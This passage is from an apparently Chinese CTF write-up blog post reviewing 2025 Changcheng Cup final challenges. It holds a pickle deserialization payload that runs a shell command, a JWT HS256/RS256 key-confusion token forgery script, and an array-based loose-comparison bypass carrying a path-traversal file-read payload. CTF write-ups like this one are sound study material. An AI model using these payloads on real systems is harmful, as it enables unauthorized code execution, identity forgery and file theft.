<p><img src="/2025/06/26/2025%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E4%BA%91%E5%A4%8D%E7%9B%98/3.png" alt="alt text"></p>
<p>在static下获取到flag</p>
<p>或者</p>
<p>gen-opcode.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">genpoc</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        s = <span class="string">&quot;&quot;&quot;ls -al / &gt; ./static/img/shell.out&quot;&quot;&quot;</span>   要执行的命令</span><br><span class="line">        <span class="keyword">return</span> os.system, (s,)         reduce函数必须返回元组或字符串</span><br><span class="line"></span><br><span class="line">e = genpoc()</span><br><span class="line">poc = pickle.dumps(e)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(poc))</span><br></pre></td></tr></table></figure>

<p>运行后base64解码保存下来</p>
<p><img src="/2025/06/26/2025%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E4%BA%91%E5%A4%8D%E7%9B%98/4.png" alt="alt text"></p>
<p>用burp上传一下</p>
<p><img src="/2025/06/26/2025%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E4%BA%91%E5%A4%8D%E7%9B%98/5.png" alt="alt text"></p>
<p>最后访问..&#x2F;..&#x2F;static&#x2F;shell.out在环境变量里面得到flag</p>
<p><img src="/2025/06/26/2025%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E4%BA%91%E5%A4%8D%E7%9B%98/6.png" alt="alt text"></p>
<h2 id="Deprecated"><a href="#Deprecated" class="headerlink" title="Deprecated"></a>Deprecated</h2><p>这里的jwt写的很奇怪</p>
<p><img src="/2025/06/26/2025%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E4%BA%91%E5%A4%8D%E7%9B%98/7.png" alt="alt text"></p>
<p>decode的时候支持使用非对称RS256和对称HS256，但是签名的时候用的是非对称加密RS256</p>
<p>如果能拿到公钥，那么就可以任意身份伪造</p>
<p>参考2024网鼎杯青龙组web01，用多个hs256计算得到的结果攻击出来公钥</p>
<p><img src="/2025/06/26/2025%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E4%BA%91%E5%A4%8D%E7%9B%98/8.png" alt="alt text"></p>
<p>得到公钥，直接伪造即可</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> publicKey  = fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;./b3ec3db187fa955c_65537_x509.pem&#x27;</span>, <span class="string">&#x27;utf8&#x27;</span>);</span><br><span class="line">data=&#123;</span><br><span class="line">    <span class="attr">username</span>: <span class="string">&quot;admin&quot;</span>, <span class="attr">priviledge</span>:<span class="string">&#x27;File-Priviledged-User&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">data = <span class="title class_">Object</span>.<span class="title function_">assign</span>(data);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(jwt.<span class="title function_">sign</span>(data, publicKey, &#123; <span class="attr">algorithm</span>:<span class="string">&#x27;HS256&#x27;</span>&#125;))</span><br></pre></td></tr></table></figure>

<p>checkfile路由存在文件读取</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/checkfile&#x27;</span>, <span class="title class_">AuthMiddleware</span>, <span class="title function_">async</span> (req, res, next) =&gt; &#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">let</span> user = <span class="keyword">await</span> db.<span class="title function_">getUser</span>(req.<span class="property">data</span>.<span class="property">username</span>);</span><br><span class="line">        <span class="keyword">if</span> (user === <span class="literal">undefined</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">`user <span class="subst">$&#123;req.data.username&#125;</span> doesn&#x27;t exist.`</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (req.<span class="property">data</span>.<span class="property">username</span> === <span class="string">&#x27;admin&#x27;</span> &amp;&amp; req.<span class="property">data</span>.<span class="property">priviledge</span>===<span class="string">&#x27;File-Priviledged-User&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">let</span> file=req.<span class="property">query</span>.<span class="property">file</span>;</span><br><span class="line">            <span class="keyword">if</span> (!file) &#123;</span><br><span class="line">                <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&#x27;File name not specified.&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_">allowedFile</span>(file)) &#123;</span><br><span class="line">                <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&#x27;File type not allowed.&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (file.<span class="title function_">includes</span>(<span class="string">&#x27; &#x27;</span>) || file.<span class="title function_">includes</span>(<span class="string">&#x27;/&#x27;</span>) || file.<span class="title function_">includes</span>(<span class="string">&#x27;..&#x27;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&#x27;Invalid filename!&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span>(err)&#123;</span><br><span class="line">                <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&#x27;An error occured!&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (file.<span class="property">length</span> &gt; <span class="number">10</span>) &#123;</span><br><span class="line">                file = file.<span class="title function_">slice</span>(<span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">const</span> returned = path.<span class="title function_">resolve</span>(<span class="string">&#x27;./&#x27;</span> + file);</span><br><span class="line">            fs.<span class="title function_">readFile</span>(returned, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (err) &#123;</span><br><span class="line">                    <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&#x27;An error occured!&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                res.<span class="title function_">sendFile</span>(returned);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&#x27;Sorry Only priviledged Admin can check the file.&#x27;</span>).<span class="title function_">status</span>(<span class="number">403</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">catch</span> (err)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">next</span>(err);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">allowedFile</span> = (<span class="params">file</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> format = file.<span class="title function_">slice</span>(file.<span class="title function_">indexOf</span>(<span class="string">&#x27;.&#x27;</span>) + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> format == <span class="string">&#x27;log&#x27;</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>这个逻辑其实乍一眼看没问题 ，但是重点在这里</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return format == &#x27;log&#x27;;</span><br></pre></td></tr></table></figure>

<p>nodejs也有弱比较和强比较 这里就意味着形如这样也能返回true</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">console.log([&#x27;log&#x27;]==&quot;log&quot;)</span><br></pre></td></tr></table></figure>

<p>那思路就很简单了，使用数组。利用js中indexOf这些都支持数组和字符串的函数即可绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var filename = [&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;../../../../../flag.txt&#x27;,&quot;./&quot;,&#x27;.&#x27;,&#x27;log&#x27;]</span><br></pre></td></tr></table></figure>

<p><img src="/2025/06/26/2025%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E4%BA%91%E5%A4%8D%E7%9B%98/9.png" alt="alt text"></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://sakuraraindrop.github.io">cheng_xing</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://sakuraraindrop.github.io/2025/06/26/2025%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E4%BA%91%E5%A4%8D%E7%9B%98/">https://sakuraraindrop.github.io/2025/06/26/2025%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E4%BA%91%E5%A4%8D%E7%9B%98/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://sakuraraindrop.github.io" target="_blank">cheng_xing's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/AI/">AI</a><a class="post-meta__tags" href="/tags/python%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/">python格式化字符串漏洞</a><a class="post-meta__tags" href="/tags/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">pickle反序列化</a><a class="post-meta__tags" href="/tags/RS256%E5%BC%B1%E5%85%AC%E9%92%A5jwt%E4%BC%AA%E9%80%A0/">RS256弱公钥jwt伪造</a><a class="post-meta__tags" href="/tags/nodejs%E5%BC%B1%E6%AF%94%E8%BE%83/">nodejs弱比较</a></div><div class="post-share"><div class="social-share" data-image="/img/ltx.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related  no-desc" href="/2025/06/25/ctfshow-sql%E6%B3%A8%E5%85%A5/" title="ctfshow-sql注入"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">ctfshow-sql注入</div></div></div></a><a class="pagination-related  no-desc" href="/2025/06/27/DASCTF-2025%E4%B8%8A%E5%8D%8A%E5%B9%B4%E8%B5%9B%E5%A4%8D%E7%8E%B0/" title="DASCTF-2025上半年赛复现"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">DASCTF-2025上半年赛复现</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related no-desc" href="/2025/04/04/XYCTF2025/" title="XYCTF2025"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-04-04</div><div class="info-item-2">XYCTF2025</div></div></div></a><a class="pagination-related no-desc" href="/2025/05/08/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="python反序列化"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-08</div><div class="info-item-2">python反序列化</div></div></div></a><a class="pagination-related no-desc" href="/2025/04/30/%E7%8E%84%E6%9C%BAweb/" title="玄机web"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-04-30</div><div class="info-item-2">玄机web</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/ltx.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">cheng_xing</div><div class="author-info-description">web菜鸡修炼中</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">25</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">73</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/sakuraraindrop"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/sakuraraindrop" target="_blank" title="Github"><i class="fab fa-github" style="color: #hdhfbb;"></i></a><a class="social-icon" href="https://space.bilibili.com/504596197" target="_blank" title="Bilibili"><i class="fab fa-bilibili" style="color: #000000;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%99%9A%E6%8B%9F%E8%BA%AB%E4%BB%BD%E8%BE%A8%E8%AF%86%E6%88%98"><span class="toc-number">1.</span> <span class="toc-text">虚拟身份辨识战</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%AF%A6%E6%83%85"><span class="toc-number">1.1.</span> <span class="toc-text">题目详情</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%BF%A1%E6%81%AF"><span class="toc-number">1.1.1.</span> <span class="toc-text">文件信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9B%B4%E5%A4%9A%E4%BF%A1%E6%81%AF"><span class="toc-number">1.1.2.</span> <span class="toc-text">更多信息</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C%E7%8E%AF%E5%A2%83"><span class="toc-number">1.2.</span> <span class="toc-text">运行环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%AD%E7%BB%83%E6%A8%A1%E5%9E%8B"><span class="toc-number">1.3.</span> <span class="toc-text">训练模型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%84%E6%B5%8B%E7%BB%93%E6%9E%9C"><span class="toc-number">1.4.</span> <span class="toc-text">预测结果</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bookstore"><span class="toc-number">2.</span> <span class="toc-text">bookstore</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Deprecated"><span class="toc-number">3.</span> <span class="toc-text">Deprecated</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/06/30/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-cloudnet/" title="春秋云境-cloudnet">春秋云境-cloudnet</a><time datetime="2025-06-30T06:04:16.000Z" title="发表于 2025-06-30 14:04:16">2025-06-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/06/27/DASCTF-2025%E4%B8%8A%E5%8D%8A%E5%B9%B4%E8%B5%9B%E5%A4%8D%E7%8E%B0/" title="DASCTF-2025上半年赛复现">DASCTF-2025上半年赛复现</a><time datetime="2025-06-27T14:26:50.000Z" title="发表于 2025-06-27 22:26:50">2025-06-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/06/26/2025%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E4%BA%91%E5%A4%8D%E7%9B%98/" title="2025长城杯决赛部分题目云复盘">2025长城杯决赛部分题目云复盘</a><time datetime="2025-06-26T14:35:47.000Z" title="发表于 2025-06-26 22:35:47">2025-06-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/06/25/ctfshow-sql%E6%B3%A8%E5%85%A5/" title="ctfshow-sql注入">ctfshow-sql注入</a><time datetime="2025-06-25T14:48:35.000Z" title="发表于 2025-06-25 22:48:35">2025-06-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/06/25/ctfshow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" title="ctfshow-文件上传">ctfshow-文件上传</a><time datetime="2025-06-25T09:13:54.000Z" title="发表于 2025-06-25 17:13:54">2025-06-25</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/hk.jpg);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2025 By cheng_xing</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.0-b1</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>